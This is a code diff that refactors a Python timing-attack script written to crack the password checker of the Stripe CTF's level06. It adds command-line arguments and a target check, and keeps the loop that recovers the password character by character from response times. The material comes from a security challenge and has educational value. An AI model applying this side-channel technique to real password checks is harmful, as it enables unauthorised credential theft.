@@ -1,14 +1,11 @@
 # -*- coding: utf-8 -*-
 
+import argparse
 import sys
 import time
 import subprocess
 from operator import itemgetter
 
-CHARACTERS		= "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0213456789"
-PROCESS			= "/levels/level06"
-PASSWORD_FILE	= "/home/the-flag/.password"
-TRIALS			= 2
 
 def stdout_write(string):
 	"""
@@ -114,17 +111,40 @@ def character_time(character):
 	return end_time - start_time
 
 
-password = ""
-
-while not is_correct(password):
-	guesses = trial(CHARACTERS)
+if __name__ == '__main__':
+	parser = argparse.ArgumentParser(description="A timing attack designed to crack the password of the Stripe CTF's level06.", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+	parser.add_argument('process', help="The path to level06.", default="/levels/level06", nargs='?')
+	parser.add_argument('password_file', help="The path to the password file.", default="/home/the-flag/.password", nargs='?')
+	parser.add_argument('-c', '--characters', help="A string of possible characters to check.", default="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0213456789")
+	parser.add_argument('-t', '--trials', help="The number of trials to run. More trials improve accuracy at the expense of speed.", default=2, type=int)
 	
-	while len(guesses) > 1:
-		guesses = list(set(trial(guesses)) & set(trial(guesses)))
+	arguments = parser.parse_args()
 	
-	if len(guesses) > 0:
-		password += guesses[0]
+	CHARACTERS, PASSWORD_FILE, PROCESS, TRIALS = arguments.characters, arguments.password_file, arguments.process, arguments.trials
+	
+	try: # Make sure PROCESS is pointing to some copy of level06.
+		open(PROCESS)
+		process = subprocess.Popen([PROCESS, PASSWORD_FILE, ''], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		assert process.stderr.read(32) == "Welcome to the password checker!"
+	except IOError:
+		print "Couldn't access %s. Are you sure that's the right path?" % PROCESS
+		sys.exit(1)
+	except AssertionError:
+		print "%s doesn't seem to be a copy of level06. Are you sure that's the right path?" % PROCESS
+		sys.exit(1)
+	
+	
+	password = ""
+	
+	while not is_correct(password):
+		guesses = trial(CHARACTERS)
 		
-		stdout_write(guesses[0])
-
-stdout_write('\n')
+		while len(guesses) > 1:
+			guesses = list(set(trial(guesses)) & set(trial(guesses)))
+		
+		if len(guesses) > 0:
+			password += guesses[0]
+			
+			stdout_write(guesses[0])
+	
+	stdout_write('\n')
